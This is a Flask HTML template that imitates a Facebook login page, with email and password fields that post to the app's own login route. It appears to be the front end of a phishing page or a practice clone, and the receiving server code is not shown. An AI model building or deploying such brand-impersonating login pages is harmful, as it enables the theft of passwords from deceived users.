<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
  <div class="container">
    <form class="login-form" action="{{ url_for('login') }}" method="post">
      <h2>Login to Facebook</h2>
      <input type="text" name="email" placeholder="Email or Phone">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Log In</button>
      <p class="forgot-password"><a href="#">Forgot Password?</a></p>
      <p class="create-account">Don't have an account? <a href="#">Create One</a></p>
      <a href="#" class="facebook-icon"><i class="fab fa-facebook fa-3x"></i></a>
    </form>
  </div>
</body>
</html>
